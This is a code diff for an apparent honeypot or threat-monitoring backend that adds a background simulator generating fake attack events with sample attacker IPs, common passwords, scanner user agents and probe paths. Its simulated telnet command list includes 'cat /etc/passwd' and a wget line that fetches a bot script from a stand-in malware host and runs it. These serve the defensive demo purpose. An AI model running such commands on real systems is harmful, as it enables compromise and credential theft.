@@ -1,7 +1,9 @@
 import asyncio
 import json
 import os
+import random
 from typing import List
+from datetime import datetime
 
 from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, Query
 from fastapi.middleware.cors import CORSMiddleware
@@ -32,6 +34,76 @@ _ws_clients: List[WebSocket] = []
 async def startup():
     await database.init_db()
     print("[*] Database initialised")
+    asyncio.create_task(_run_simulator())
+
+
+# ─── Built-in Attack Simulator ────────────────────────────────────────────────
+
+_ATTACKERS = [
+    "185.220.101.45","103.75.190.12","45.142.212.100","196.235.100.22",
+    "222.186.61.19","91.240.118.172","180.101.88.197","134.209.82.19",
+    "62.233.50.11","103.144.209.50","45.227.255.191","159.89.49.100",
+    "185.156.73.54","41.223.57.47","110.232.117.186","5.188.206.26",
+    "123.58.182.50","200.234.177.30","77.247.181.163","103.207.39.120",
+]
+_USERNAMES = ["root","admin","ubuntu","pi","user","test","postgres","deploy"]
+_PASSWORDS = ["123456","password","admin","root","12345","qwerty","admin123"]
+_PATHS     = ["/wp-login.php","/phpmyadmin/","/.env","/admin/","/xmlrpc.php"]
+_UAS       = ["sqlmap/1.7.8","Nikto/2.1.6","masscan/1.3.2","curl/7.88.1"]
+_CMDS      = ["id","uname -a","cat /etc/passwd",
+              "wget http://malware.example.com/bot.sh -O /tmp/b && chmod +x /tmp/b && /tmp/b"]
+_NODES     = ["node-local-01","node-sg-02","node-us-03","node-eu-04"]
+
+def _make_sim_event():
+    svc = random.choices(["ssh","ssh","ssh","http","http","telnet","ftp"], k=1)[0]
+    ip  = random.choice(_ATTACKERS)
+    ts  = datetime.utcnow().isoformat()
+    port = random.randint(30000, 65000)
+    node = random.choice(_NODES)
+    if svc == "ssh":
+        return AttackEvent(node_id=node, timestamp=ts, attacker_ip=ip,
+            attacker_port=port, service="ssh", event_type="credential_attempt",
+            data={"username": random.choice(_USERNAMES), "password": random.choice(_PASSWORDS)})
+    elif svc == "http":
+        is_post = random.random() < 0.3
+        return AttackEvent(node_id=node, timestamp=ts, attacker_ip=ip,
+            attacker_port=port, service="http",
+            event_type="credential_attempt" if is_post else "scan_probe",
+            data={"method": "POST" if is_post else "GET",
+                  "path": random.choice(_PATHS), "user_agent": random.choice(_UAS)})
+    elif svc == "telnet":
+        has_cmd = random.random() < 0.4
+        cmd = random.choice(_CMDS) if has_cmd else None
+        return AttackEvent(node_id=node, timestamp=ts, attacker_ip=ip,
+            attacker_port=port, service="telnet",
+            event_type="command_executed" if has_cmd else "credential_attempt",
+            data={"username": random.choice(_USERNAMES), "password": random.choice(_PASSWORDS)},
+            raw_payload=cmd)
+    else:
+        return AttackEvent(node_id=node, timestamp=ts, attacker_ip=ip,
+            attacker_port=port, service="ftp", event_type="credential_attempt",
+            data={"username": random.choice(["anonymous","admin","ftp"]),
+                  "password": random.choice(_PASSWORDS)})
+
+async def _run_simulator():
+    """Continuously generate simulated attack events in the background."""
+    await asyncio.sleep(5)  # Wait for DB to be ready
+    print("[*] Built-in simulator started")
+    while True:
+        try:
+            event = _make_sim_event()
+            event_id = await database.store_event(event)
+            geo = await analyzer.geolocate(event.attacker_ip)
+            await database.update_event_geo(event_id, geo)
+            threat = await analyzer.analyze_event(event)
+            iocs = await ioc_generator.check_and_generate(event.attacker_ip)
+            await _broadcast({"type": "event", "data": {
+                "event": {**event.dict(), "id": event_id},
+                "geo": geo, "threat": threat, "iocs": iocs,
+            }})
+        except Exception as e:
+            print(f"[!] Simulator error: {e}")
+        await asyncio.sleep(random.uniform(8, 20))
 
 
 # ─── Event Ingestion ──────────────────────────────────────────────────────────
